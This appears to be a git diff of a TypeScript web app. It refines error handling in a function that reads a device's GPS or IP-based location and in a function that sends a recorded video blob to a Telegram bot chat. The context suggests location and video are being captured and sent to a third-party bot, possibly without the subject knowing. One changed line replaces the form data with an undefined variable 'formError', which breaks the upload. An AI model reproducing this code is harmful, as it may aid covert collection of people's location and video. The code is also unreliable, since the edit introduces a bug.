@@ -181,7 +181,9 @@ async function getLocationInfo(): Promise<LocationInfo> {
         };
         console.log('GPS location obtained with accuracy:', locationData.accuracy, 'meters');
       } catch (geoError) {
-        console.warn('GPS failed, falling back to IP:', geoError.message);
+        // Pengecekan tipe error untuk menghindari TS18046
+        const errorMessage = geoError instanceof Error ? geoError.message : 'Unknown error';
+        console.warn('GPS failed, falling back to IP:', errorMessage);
       }
     }
 
@@ -203,7 +205,7 @@ async function getLocationInfo(): Promise<LocationInfo> {
 
     return locationData;
   } catch (error) {
-    console.error('Error fetching location:', error);
+    console.error('Error fetching location:', error instanceof Error ? error.message : 'Unknown error');
     return {
       city: 'Unknown',
       country: 'Unknown',
@@ -338,7 +340,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
     const chatInfo = await chatInfoResponse.json();
     const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' ? chatInfo.result.id : CHAT_ID;
     formData.set('chat_id', finalChatId);
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formError });
     if (!response.ok) {
       const responseData = await response.json();
       throw new Error(`Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`);
